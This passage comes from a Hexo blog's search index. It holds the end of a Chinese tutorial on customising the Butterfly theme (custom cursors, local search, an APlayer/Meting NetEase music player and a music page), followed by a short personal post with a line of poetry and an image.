class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 全局默认鼠标指针 */</span></span><br><span class="line"><span class="selector-tag">body</span>,</span><br><span class="line"><span class="selector-tag">html</span>&#123;</span><br><span class="line">  <span class="attribute">cursor</span>: <span class="built_in">url</span>(<span class="string">&#x27;指定样式cur文件路径&#x27;</span>),auto <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 悬停图片时的鼠标指针 */</span></span><br><span class="line"><span class="selector-tag">img</span>&#123;</span><br><span class="line">  <span class="attribute">cursor</span>: <span class="built_in">url</span>(<span class="string">&#x27;指定样式cur文件路径&#x27;</span>),auto <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 选择链接标签时的鼠标指针 */</span></span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">    <span class="attribute">cursor</span>: <span class="built_in">url</span>(<span class="string">&#x27;指定样式cur文件路径&#x27;</span>),auto;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 选中输入框时的鼠标指针 */</span></span><br><span class="line"><span class="selector-tag">input</span><span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">    <span class="attribute">cursor</span>: <span class="built_in">url</span>(<span class="string">&#x27;指定样式cur文件路径&#x27;</span>),auto;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 悬停按钮时的鼠标指针 */</span></span><br><span class="line"><span class="selector-tag">button</span><span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">    <span class="attribute">cursor</span>: <span class="built_in">url</span>(<span class="string">&#x27;指定样式cur文件路径&#x27;</span>),auto;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 悬停列表标签时的鼠标指针 */</span></span><br><span class="line"><span class="selector-tag">i</span><span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">    <span class="attribute">cursor</span>: <span class="built_in">url</span>(<span class="string">&#x27;指定样式cur文件路径&#x27;</span>),auto;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 悬停页脚链接标签（例如页脚徽标）时的鼠标指针 */</span></span><br><span class="line"><span class="selector-id">#footer-wrap</span> <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">      <span class="attribute">cursor</span>: <span class="built_in">url</span>(<span class="string">&#x27;指定样式cur文件路径&#x27;</span>),auto;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 悬停页码时的鼠标指针 */</span></span><br><span class="line"><span class="selector-id">#pagination</span> <span class="selector-class">.page-number</span><span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">      <span class="attribute">cursor</span>: <span class="built_in">url</span>(<span class="string">&#x27;指定样式cur文件路径&#x27;</span>),auto;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 悬停菜单栏时的鼠标指针 */</span></span><br><span class="line"><span class="selector-id">#nav</span> <span class="selector-class">.site-page</span><span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">      <span class="attribute">cursor</span>: <span class="built_in">url</span>(<span class="string">&#x27;指定样式cur文件路径&#x27;</span>),auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="功能插件安装"><a href="#功能插件安装" class="headerlink" title="功能插件安装"></a>功能插件安装</h2><h3 id="本地搜索"><a href="#本地搜索" class="headerlink" title="本地搜索"></a>本地搜索</h3><blockquote><p>修改主题配置文件</p></blockquote><p>打开主题配置中<code>local_search</code>，安装<code>npm install hexo-generator-search --save</code></p><p>主题<code>_config.yml</code>中添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  content: true</span><br><span class="line">  template: ./search.xml</span><br></pre></td></tr></table></figure><h3 id="网易云音乐全局引用"><a href="#网易云音乐全局引用" class="headerlink" title="网易云音乐全局引用"></a>网易云音乐全局引用</h3><blockquote><p>hexo项目根目录引入配置</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aplayer:</span><br><span class="line">  meting: true</span><br><span class="line">  asset_inject: false</span><br></pre></td></tr></table></figure><blockquote><p>_config.butterfly.yml主题配置文件中配置aplayerInject</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Inject the css and script (aplayer/meting)</span><br><span class="line">aplayerInject:</span><br><span class="line">  enable: true</span><br><span class="line">  per_page: true</span><br></pre></td></tr></table></figure><blockquote><p>插入代码到页脚</p></blockquote><p>需要切换页面音乐不中断，则将主题配置文件中的pjax设置为true即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">inject:</span><br><span class="line">  head:</span><br><span class="line">  bottom:</span><br><span class="line">    - &lt;div class=&quot;aplayer no-destroy&quot; data-id=&quot;2643422422&quot; data-server=&quot;netease&quot; data-type=&quot;playlist&quot; data-fixed=&quot;true&quot; data-autoplay=&quot;true&quot;&gt; &lt;/div&gt;</span><br></pre></td></tr></table></figure><p>注：网易云我喜欢列表似乎有bug，无法显示</p><h2 id="音乐页面"><a href="#音乐页面" class="headerlink" title="音乐页面"></a>音乐页面</h2><blockquote><p>hexo-butterfly使用aplayer加载音乐页面</p></blockquote><p>参考原文：<a href="https://blog.51cto.com/alexclownfish/3051070">https://blog.51cto.com/alexclownfish/3051070</a> 作者：**<a href="https://blog.51cto.com/alexclownfish">Alexclownfish</a>**</p><hr><p>由于hexo butterfly主题作者没有详细说明如何加载aplayer，之指明了aplayer官网文档。但是官网文档的教程未免有些难懂（尤其是对于新手），因为网上找到的大多为ejs创造的主题，而本主题使用了pug，所以，我将我摸索的经验在此公布，希望能带给使用pug编写的主题的朋友们一些帮助</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo new page music</span><br><span class="line">npm install aplayer</span><br><span class="line">npm install --save hexo-tag-aplayer</span><br></pre></td></tr></table></figure><p>接着，假如安装成功，则可以定位到主题目录\layout\includes看看layout.pug应该出现以下字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> head</span><br><span class="line">    include ./head.pug</span><br><span class="line">     link(rel=&quot;stylesheet&quot; href=&quot;APlayer.min.css&quot;)</span><br><span class="line">     div(id=&quot;aplayer&quot;)</span><br><span class="line">     script(src=&quot;&lt;https://cdn.jsdelivr.net/gh/radium-bit/res@master/live2d/autoload.js&gt;&quot; async)</span><br><span class="line">     script(src=&quot;&lt;https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js&gt;&quot; async)</span><br><span class="line">  body</span><br><span class="line">1.2.3.4.5.6.7.</span><br></pre></td></tr></table></figure><p>若不存在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">link(rel=&quot;stylesheet&quot; href=&quot;APlayer.min.css&quot;)</span><br><span class="line">div(id=&quot;aplayer&quot;)</span><br><span class="line">script(src=&quot;&lt;https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js&gt;&quot; async)</span><br><span class="line">1.2.3.</span><br></pre></td></tr></table></figure><p>若不存在请手动加上。一定要注意缩进与上述结构一致！因为缩进是Pug的表达方式。接着，查看aplayer.pug，若文件不存在。请创建文件并复制以下内容手动加上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">link(rel=&quot;stylesheet&quot; type=&#x27;text/css&#x27;, href=&quot;&lt;https://cdn.jsdelivr.net/npm/aplayer@1.10/dist/APlayer.min.css&gt;&quot;)</span><br><span class="line">script(type=&#x27;text/javascript&#x27;, src=&quot;&lt;https://cdn.jsdelivr.net/npm/aplayer@1.10/dist/APlayer.min.js&gt;&quot;)</span><br><span class="line">script(type=&#x27;text/javascript&#x27;, src=&quot;&lt;https://cdn.jsdelivr.net/npm/meting@1.2/dist/Meting.min.js&gt;&quot;)</span><br><span class="line">1.2.3.</span><br></pre></td></tr></table></figure><p>最后，返回博客根目录，查看_config.yml在最后添加以下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#aplayer</span><br><span class="line">aplayer:</span><br><span class="line">  script_dir: js                      # Public 目录下脚本目录路径，默认: &#x27;assets/js&#x27;</span><br><span class="line">  style_dir: css                         # Public 目录下样式目录路径，默认: &#x27;assets/css&#x27;</span><br><span class="line">  #cdn: &lt;http://xxx/aplayer.min.js&gt;                # 引用 APlayer.js 外部 CDN 地址 (默认不开启)</span><br><span class="line">  #style_cdn: &lt;http://xxx/aplayer.min.css&gt;         # 引用 APlayer.css 外部 CDN 地址 (默认不开启)</span><br><span class="line">  meting: true                                  # MetingJS 支持</span><br><span class="line">  #meting_api: &lt;http://xxx/api.php&gt;                # 自定义 Meting API 地址</span><br><span class="line">  #meting_cdn: &lt;http://xxx/Meing.min.js&gt;           # 引用 Meting.js 外部 CDN 地址 (默认不开启)</span><br><span class="line">  asset_inject: true                            # 自动插入 Aplayer.js 与 Meting.js 资源脚本, 默认开启</span><br><span class="line">  #externalLink: &lt;http://xxx/aplayer.min.js&gt;       # 老版本参数，功能与参数 cdn 相同meting: true</span><br><span class="line">1.2.3.4.5.6.7.8.9.10.11.</span><br></pre></td></tr></table></figure><p>并调整</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post_asset_folder: true</span><br></pre></td></tr></table></figure><p>最后，在 博客根目录\source\music\index.md使用以下格式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 我的歌单</span><br><span class="line">date: 2019-05-17 16:14:00</span><br><span class="line">cover: <span class="language-xml">&lt;https://cdn.jsdelivr.net/gh/radium-bit/res@latest/Music.jpg&gt;</span></span><br><span class="line"><span class="section">type: &quot;music&quot;</span></span><br><span class="line"><span class="section">---</span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">#0c74d6</span> <span class="attr">size</span>=<span class="string">3</span> <span class="attr">face</span>=<span class="string">&quot;黑体&quot;</span>&gt;</span></span><span class="strong">**这是歌单介绍，如果不需要刻意留空**</span><span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&#123;% meting &quot;697054881&quot; &quot;netease&quot; &quot;playlist&quot; %&#125;</span><br><span class="line">1.2.3.4.5.6.7.8.9.10.</span><br></pre></td></tr></table></figure><p>那一串数字是歌单ID，“netease”为网易云音乐。详细参数用法请参考官方文档歌单ID提取方法是以链接分享某个歌单例如<a href="https://music.163.com/playlist?id=313418853&userid=1362990007">https://music.163.com/playlist?id=313418853&amp;userid=1362990007</a></p><p>红色部分就是歌单ID了</p><p>写入完毕后，回到CMD。输入<code>hexo g</code></p><p>生成完毕！接下来就可以部署到你的服务器啦(…•˘_˘•…)</p>]]></content>
      
      
      
        <tags>
            
            <tag> 博客主题类 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>all will be fine</title>
      <link href="/2023/02/16/all-will-be-fine/"/>
      <url>/2023/02/16/all-will-be-fine/</url>
      
        <content type="html"><![CDATA[<blockquote><p>城市万家灯火，暂歇长安，临江寄灯火望游思于天际。</p></blockquote><p>起风了~</p><p><img src="https://s2.loli.net/2023/08/24/n2DS1vVy5tJOWEC.png" alt="image-20230824211031993"></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
